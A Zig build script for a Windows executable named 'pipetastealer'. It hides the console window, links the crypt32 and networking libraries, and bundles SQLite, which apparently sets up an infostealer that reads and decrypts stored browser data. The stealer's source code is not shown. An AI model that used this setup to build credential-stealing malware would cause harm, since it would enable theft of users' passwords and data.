const std = @import("std");
pub fn build(b: *std.Build) void {
    const target = b.standardTargetOptions(.{});
    const optimize = b.standardOptimizeOption(.{});

    const exe = b.addExecutable(.{
        .name = "pipetastealer",
        .root_module = b.createModule(.{
            .root_source_file = b.path("src/main.zig"),
            .target = target,
            .optimize = optimize,
            .link_libc = true,
        }),
    });
    
    // Hide console
    exe.subsystem = .Windows;
    
    exe.root_module.linkSystemLibrary("crypt32", .{});
    exe.root_module.linkSystemLibrary("ws2_32", .{});
    exe.root_module.addCSourceFile(.{
        .file = b.path("deps/sqlite3.c"),
        .flags = &[_][]const u8{ "-DSQLITE_THREADSAFE=0", "-DSQLITE_OMIT_LOAD_EXTENSION" },
    });
    exe.root_module.addIncludePath(b.path("deps"));

    b.installArtifact(exe);
}
